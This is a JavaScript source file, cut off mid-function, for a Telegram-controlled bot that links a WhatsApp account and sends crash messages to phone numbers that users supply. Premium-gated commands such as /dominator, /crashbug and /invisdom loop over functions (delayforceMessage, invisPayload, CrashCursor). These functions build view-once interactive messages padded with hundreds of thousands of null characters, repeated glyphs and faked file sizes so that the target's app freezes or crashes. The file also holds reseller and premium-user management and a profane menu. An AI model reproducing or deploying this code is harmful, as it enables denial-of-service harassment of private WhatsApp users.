const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const crypto = require("crypto");
const { 
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const { TokenS, admins } = require("/Setting");
const { githubToken, githubRepo, githubFilePath, ownerId, githubResellerFilePath } = require("./set");

const bot = new TelegramBot(TokenS, { polling: true });
const PREMIUM_FILE = './premiumusers.json';
let zephy = null;
let WhatsAppConnected = false;

// ==================== FUNGSI UTAMA ====================
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const isAdmin = (userId) => admins.includes(String(userId));
const isOwner = (userId) => String(userId) === String(ownerId);

// ==================== FUNGSI PREMIUM ====================
const readPremiumUsers = async () => {
  try {
    const data = await fs.promises.readFile(PREMIUM_FILE, 'utf-8');
    const jsonData = JSON.parse(data);
    
    if (!jsonData || !Array.isArray(jsonData.premiumUsers)) {
      throw new Error('Format file premium tidak valid');
    }
    
    return jsonData.premiumUsers.map(id => String(id));
  } catch (error) {
    if (error.code === 'ENOENT') {
      await fs.promises.writeFile(PREMIUM_FILE, JSON.stringify({ premiumUsers: [] }, null, 2));
      return [];
    }
    throw error;
  }
};

const writePremiumUsers = async (premiumUsers) => {
  await fs.promises.writeFile(
    PREMIUM_FILE,
    JSON.stringify({ premiumUsers }, null, 2),
    'utf-8'
  );
};

const isPremiumUser = async (userId) => {
  const premiumUsers = await readPremiumUsers();
  return premiumUsers.includes(String(userId));
};

// ==================== FUNGSI LAINNYA ====================
const sendTypingIndicator = async (chatId) => {
  await bot.sendChatAction(chatId, 'typing');
};

const fetchResellers = async () => {
  try {
    const url = `https://raw.githubusercontent.com/${githubRepo}/main/${githubResellerFilePath}?t=${Date.now()}`;
    const response = await axios.get(url, { timeout: 10000 });
    
    if (!response.data || !Array.isArray(response.data.resellers)) {
      throw new Error('Format JSON reseller tidak valid');
    }
    
    return response.data.resellers.map(r => String(r).trim());
  } catch (error) {
    console.error('[RESELLER] Gagal mengambil data:', error);
    return [];
  }
};

const isAuthorized = async (userId) => {
  const userIdStr = String(userId);
  if (isOwner(userIdStr)) return true;
  
  const resellers = await fetchResellers();
  return resellers.includes(userIdStr);
};

// ==================== HANDLER COMMAND ====================
// Handler: /addprem
bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const targetId = match[1].trim();

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak! Hanya admin yang bisa menambahkan premium.');
  }

  if (!/^\d+$/.test(targetId)) {
    return bot.sendMessage(chatId, '❌ Format ID tidak valid!');
  }

  try {
    const premiumUsers = await readPremiumUsers();
    if (premiumUsers.includes(targetId)) {
      return bot.sendMessage(chatId, '❌ User sudah premium!');
    }

    premiumUsers.push(targetId);
    await writePremiumUsers(premiumUsers);
    bot.sendMessage(chatId, `✅ User ${targetId} berhasil ditambahkan ke premium!`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /delprem
bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const targetId = match[1].trim();

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak! Hanya admin yang bisa menghapus premium.');
  }

  try {
    let premiumUsers = await readPremiumUsers();
    if (!premiumUsers.includes(targetId)) {
      return bot.sendMessage(chatId, '❌ User tidak terdaftar sebagai premium!');
    }

    premiumUsers = premiumUsers.filter(id => id !== targetId);
    await writePremiumUsers(premiumUsers);
    bot.sendMessage(chatId, `✅ User ${targetId} berhasil dihapus dari premium!`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /reqpair
bot.onText(/\/reqbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const phoneNumber = match[1].replace(/[^0-9]/g, '');

  await sendTypingIndicator(chatId);

  try {
    const code = await zephy.requestPairingCode(phoneNumber.trim());
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    bot.sendMessage(chatId, `🔑 Kode Pairing: <code>${formattedCode}</code>\n\n⚠️ Berlaku 30 detik`, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /addreseller
bot.onText(/\/addreseller (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const newResellerId = match[1].trim();

    await sendTypingIndicator(chatId);

    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, '⛔ Akses ditolak! Hanya owner yang bisa menambahkan reseller.');
    }

    try {
        if (!/^\d+$/.test(newResellerId)) {
            return bot.sendMessage(chatId, '❌ Format ID tidak valid!');
        }

        const getFileRes = await axios.get(
            `https://api.github.com/repos/${githubRepo}/contents/${githubResellerFilePath}`,
            { headers: { Authorization: `token ${githubToken}` } }
        );

        const currentData = JSON.parse(Buffer.from(getFileRes.data.content, 'base64').toString());
        if (currentData.resellers.includes(newResellerId)) {
            return bot.sendMessage(chatId, '❌ Reseller sudah terdaftar!');
        }

        currentData.resellers.push(newResellerId);
        const updatedContent = Buffer.from(JSON.stringify(currentData, null, 2)).toString('base64');

        await axios.put(
            `https://api.github.com/repos/${githubRepo}/contents/${githubResellerFilePath}`,
            {
                message: `Tambahkan reseller: ${newResellerId}`,
                content: updatedContent,
                sha: getFileRes.data.sha
            },
            { headers: { Authorization: `token ${githubToken}` } }
        );

        await bot.sendMessage(chatId, `✅ Reseller ${newResellerId} berhasil ditambahkan!`);
    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error: ${error.response?.data?.message || error.message}`);
    }
});

// Handler: /addtoken
const addTokenToGitHub = async (newToken) => {
    try {
        const tokens = await fetchTokens();
        if (tokens.includes(newToken.trim())) return false;

        const getFileRes = await axios.get(
            `https://api.github.com/repos/${githubRepo}/contents/${githubFilePath}`,
            { headers: { Authorization: `token ${githubToken}` } }
        );
        
        const newContent = Buffer.from(JSON.stringify({ tokens: [...tokens, newToken] })).toString('base64');
        
        await axios.put(
            `https://api.github.com/repos/${githubRepo}/contents/${githubFilePath}`,
            {
                message: `Add new token: ${newToken}`,
                content: newContent,
                sha: getFileRes.data.sha
            },
            { headers: { Authorization: `token ${githubToken}` } }
        );

        return true;
    } catch (error) {
        console.error('[TOKEN] Gagal update tokens:', error);
        return false;
    }
};

bot.onText(/\/addtoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const newToken = match[1];

    await sendTypingIndicator(chatId);

    if (!(await isAuthorized(userId))) {
        return bot.sendMessage(chatId, '⛔ Akses ditolak!');
    }

    try {
        const success = await addTokenToGitHub(newToken);
        if (success) {
            await bot.sendMessage(chatId, `✅ Token berhasil ditambahkan!`);
        } else {
            await bot.sendMessage(chatId, `❌ Token sudah ada/gagal update!`);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handler: /delsession
bot.onText(/\/delsession/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  await sendTypingIndicator(chatId);

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, '⛔ Akses ditolak!');
  }

  try {
    await fs.promises.rm('./session', { recursive: true, force: true });
    WhatsAppConnected = false;
    await bot.sendMessage(chatId, '✅ Session dihapus!');
    startSesi();
  } catch (error) {
    await bot.sendMessage(chatId, '❌ Gagal menghapus session!');
  }
});

// Handler: /dominator (Premium)
bot.onText(/\/dominator (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const q = match[1];
  
  await sendTypingIndicator(chatId);

  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

  if (!WhatsAppConnected) {
    return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
      reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
    });
  }

  const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  try {
    for (let i = 0; i < 100; i++) {
      await delayforceMessage(targetJid);
      await invisPayload(targetJid);
    }
    bot.sendMessage(chatId, '✅ Serangan plague berhasil diluncurkan!');
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Handler: /floidnator (Premium)
bot.onText(/\/floidnator (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const q = match[1];
  
  await sendTypingIndicator(chatId);

  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

  if (!WhatsAppConnected) {
    return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
      reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
    });
  }

  const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  try {
    for (let i = 0; i < 100; i++) {
      await invisPayload(targetJid);
    }
    bot.sendMessage(chatId, '✅ Serangan voidglx berhasil diluncurkan!');
  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

bot.onText(/\/crashbug (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const q = match[1];
        
    await sendTypingIndicator(chatId);
    
    
  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

    if (!WhatsAppConnected) {
        return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
            reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
        });
    }

    const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    try {
         for (let i = 0; i < 10; i++) {  
           await instantcrash(targetJid);
           await CrashCursor(targetJid);
           await instantcrash(targetJid);
           await CrashCursor(targetJid);
    }
        bot.sendMessage(chatId, 'Successfully launched a fatal attack');
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handler: Callback
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const queryId = query.id;

    await sendTypingIndicator(chatId);

    if (query.data === "reqpair") {
        return bot.answerCallbackQuery(queryId, {
            text: "Gunakan /reqpair [nomor] untuk pairing!",
            show_alert: true
        });
    }
});

bot.onText(/\/floidgame (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const q = match[1];
    
    await sendTypingIndicator(chatId);
    
    
  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }
    
    if (!WhatsAppConnected) {
        return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
            reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
        });
    }

    const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    try {
         for (let i = 0; i < 4; i++) {  
           await instantcrash(targetJid);
           await CrashCursor(targetJid);
    }
        bot.sendMessage(chatId, 'Successfully launched a fatal attack');
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handler: Callback
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const queryId = query.id;

    await sendTypingIndicator(chatId);

    if (query.data === "reqpair") {
        return bot.answerCallbackQuery(queryId, {
            text: "Gunakan /reqpair [nomor] untuk pairing!",
            show_alert: true
        });
    }
});

bot.onText(/\/invisdom (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    const q = match[1];
    
    await sendTypingIndicator(chatId);
    
    
  if (!(await isPremiumUser(userId))) {
    return bot.sendMessage(chatId, '⛔ Fitur ini hanya untuk user premium!\nHubungi admin untuk upgrade premium.');
  }

    if (!WhatsAppConnected) {
        return bot.sendMessage(chatId, "⛔ WhatsApp belum terhubung!", {
            reply_markup: { inline_keyboard: [[{ text: "Pair WhatsApp", callback_data: "reqpair" }]] }
        });
    }

    const targetJid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    try {
         for (let i = 0; i < 8; i++) {
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
        await invc2(targetJid);
        await invc2(targetJid);
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
        await invc2(targetJid);
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
        await CrashCursor(targetJid);
    }
        bot.sendMessage(chatId, 'Successfully launched a fatal attack');
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handler: Callback
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const queryId = query.id;

    await sendTypingIndicator(chatId);

    if (query.data === "reqpair") {
        return bot.answerCallbackQuery(queryId, {
            text: "Gunakan /reqpair [nomor] untuk pairing!",
            show_alert: true
        });
    }
});

// Handler: /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;

    // Tampilkan status mengetik
    await sendTypingIndicator(chatId);

    const zepmenu = `
<b>╭────「 ALMAS X WHIZ X VIOZ 」───❏</b>
<b>│► 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : BAPA GW</b>
<b>│► 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : BOKEP</b>
<b>╰──────────────────❏</b>    
<b>╭──[𖥂] SISTEM KONTOL</b>
<b>│► /addprem</b>
<b>│► /delprem</b>
<b>│► /reqbot</b>
<b>│► /delsession</b>
<b>╰──────────────────❏</b>
<b>╭─[✠] 「 FLOID KILL BOOL YOU 」</b>
<b>│► /dominator - delay force</b>
<b>│► /floidnator - infinities delay</b>
<b>│► /crashbug - bussiness crash</b>    
<b>│► /floidgame - crash msg</b>
<b>│► /invisdom - invisible home</b>
<b>╰──────────────────❏</b>    
<b>╭───「 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 」───❏</b>
<b>│► bapa gweh -𝙳𝚎𝚟</b>
<b>╰──────────────────❏</b>
`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "「 THE KNTL 」", url: "https://t.me/whizhaha" }],
            [{ text: "「 BOKEP 」", url: "https://t.me/rainonetime" }]
        ]
    };

    bot.sendPhoto(chatId, 'https://files.catbox.moe/d5u6ez.jpg', {
        caption: zepmenu,
        parse_mode: "HTML",
        reply_markup: keyboard
    });
});

// Error Handling
bot.on('polling_error', (error) => {
    console.error('[BOT] Error:', error);
});

// ==================== WHATSAPP CONNECTION ====================
const startSesi = async () => {
;
  
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async () => ({ conversation: 'Galaxy' }),
  };

  zephy = makeWASocket(connectionOptions);
  zephy.ev.on('creds.update', saveCreds);
  store.bind(zephy.ev);

  zephy.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      WhatsAppConnected = true;
      console.clear();
      console.log(
        chalk.bold.white(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀   
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀  
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀   
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀     
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀  
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

${chalk.bold.white('SCRIPT : ALMAS WHIZ VIOZ')}
${chalk.bold.white('VERSION : BOKEP I')}
${chalk.bold.white('DEVELOPER : BAPA GWEH')}
${chalk.bold.white('TELEGRAM : @gabutaja8')}
        `)
      );
      console.log(chalk.bold.green('[SYSTEM] WhatsApp Connected!'));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      WhatsAppConnected = false;
      shouldReconnect && startSesi();
    }
  });
};

async function delayforceMessage(targetJid) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: zephy.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await zephy.relayMessage(targetJid, message, {
      participant: { jid: targetJid },
    });
  }

async function invisPayload(targetJid) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: zephy.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [targetJid],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 19316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                ],
              },
            },
          },
        },
      };
      await zephy.relayMessage(targetJid, message, {
        participant: { jid: targetJid },
    });
}

async function CrashCursor(targetJid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: zephy.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
